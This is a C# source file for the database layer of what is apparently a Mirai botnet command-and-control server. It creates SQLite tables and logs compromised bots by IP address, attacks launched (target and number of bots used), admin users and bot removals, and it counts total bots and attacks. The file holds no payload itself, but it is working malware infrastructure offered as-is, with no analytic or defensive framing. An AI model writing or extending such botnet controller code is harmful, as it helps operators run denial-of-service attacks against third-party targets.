using System;
using System.Data.SQLite;
using System.Threading.Tasks;
using System.IO;
using Serilog;

namespace MiraiCnCServer
{
  public class DatabaseManager
  {
    private readonly string connectionString;
    private readonly string dbPath;

    public DatabaseManager(string databasePath)
    {
      dbPath = databasePath;
      connectionString = $"Data Source={databasePath};Version=3;";
    }

    public async Task InitializeAsync()
    {
      // Create directory if it doesn't exist
      var directory = Path.GetDirectoryName(dbPath);
      if (!string.IsNullOrEmpty(directory) && !Directory.Exists(directory))
      {
        Directory.CreateDirectory(directory);
      }

      using var connection = new SQLiteConnection(connectionString);
      await connection.OpenAsync();

      // Create tables
      var createTables = @"
                CREATE TABLE IF NOT EXISTS bot_connections (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip_address TEXT NOT NULL,
                    version INTEGER NOT NULL,
                    source TEXT,
                    connected_at DATETIME NOT NULL,
                    disconnected_at DATETIME,
                    is_active INTEGER DEFAULT 1
                );

                CREATE TABLE IF NOT EXISTS attacks (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    target TEXT NOT NULL,
                    command_size INTEGER NOT NULL,
                    bots_used INTEGER NOT NULL,
                    created_at DATETIME NOT NULL
                );

                CREATE TABLE IF NOT EXISTS admin_users (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    username TEXT UNIQUE NOT NULL,
                    password_hash TEXT NOT NULL,
                    created_at DATETIME NOT NULL,
                    last_login DATETIME
                );

                CREATE TABLE IF NOT EXISTS bot_removals (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    bot_id TEXT NOT NULL,
                    ip_address TEXT NOT NULL,
                    removed_at DATETIME NOT NULL,
                    method TEXT NOT NULL
                );

                CREATE INDEX IF NOT EXISTS idx_bot_ip ON bot_connections(ip_address);
                CREATE INDEX IF NOT EXISTS idx_bot_active ON bot_connections(is_active);
            ";

      using var command = new SQLiteCommand(createTables, connection);
      await command.ExecuteNonQueryAsync();

      Log.Information("[Database] Tables initialized successfully");
    }

    public async Task LogBotConnectionAsync(string ipAddress, byte version, string source)
    {
      using var connection = new SQLiteConnection(connectionString);
      await connection.OpenAsync();

      var query = "INSERT INTO bot_connections (ip_address, version, source, connected_at) VALUES (@ip, @ver, @src, @time)";
      using var command = new SQLiteCommand(query, connection);
      command.Parameters.AddWithValue("@ip", ipAddress);
      command.Parameters.AddWithValue("@ver", version);
      command.Parameters.AddWithValue("@src", source ?? "");
      command.Parameters.AddWithValue("@time", DateTime.UtcNow);

      await command.ExecuteNonQueryAsync();
    }

    public async Task LogBotDisconnectionAsync(string ipAddress)
    {
      using var connection = new SQLiteConnection(connectionString);
      await connection.OpenAsync();

      var query = "UPDATE bot_connections SET disconnected_at = @time, is_active = 0 WHERE ip_address = @ip AND is_active = 1";
      using var command = new SQLiteCommand(query, connection);
      command.Parameters.AddWithValue("@time", DateTime.UtcNow);
      command.Parameters.AddWithValue("@ip", ipAddress);

      await command.ExecuteNonQueryAsync();
    }

    public async Task LogAttackAsync(string target, int commandSize, int botsUsed)
    {
      using var connection = new SQLiteConnection(connectionString);
      await connection.OpenAsync();

      var query = "INSERT INTO attacks (target, command_size, bots_used, created_at) VALUES (@target, @size, @bots, @time)";
      using var command = new SQLiteCommand(query, connection);
      command.Parameters.AddWithValue("@target", target);
      command.Parameters.AddWithValue("@size", commandSize);
      command.Parameters.AddWithValue("@bots", botsUsed);
      command.Parameters.AddWithValue("@time", DateTime.UtcNow);

      await command.ExecuteNonQueryAsync();
    }

    public async Task LogBotRemovalAsync(string botId, string ipAddress, string method)
    {
      using var connection = new SQLiteConnection(connectionString);
      await connection.OpenAsync();

      var query = "INSERT INTO bot_removals (bot_id, ip_address, removed_at, method) VALUES (@id, @ip, @time, @method)";
      using var command = new SQLiteCommand(query, connection);
      command.Parameters.AddWithValue("@id", botId);
      command.Parameters.AddWithValue("@ip", ipAddress);
      command.Parameters.AddWithValue("@time", DateTime.UtcNow);
      command.Parameters.AddWithValue("@method", method);

      await command.ExecuteNonQueryAsync();

      Log.Information($"[Database] Logged bot removal: {ipAddress} via {method}");
    }

    public async Task<int> GetTotalBotsEverAsync()
    {
      using var connection = new SQLiteConnection(connectionString);
      await connection.OpenAsync();

      var query = "SELECT COUNT(*) FROM bot_connections";
      using var command = new SQLiteCommand(query, connection);

      var result = await command.ExecuteScalarAsync();
      return Convert.ToInt32(result);
    }

    public async Task<int> GetTotalAttacksAsync()
    {
      using var connection = new SQLiteConnection(connectionString);
      await connection.OpenAsync();

      var query = "SELECT COUNT(*) FROM attacks";
      using var command = new SQLiteCommand(query, connection);

      var result = await command.ExecuteScalarAsync();
      return Convert.ToInt32(result);
    }
  }
}
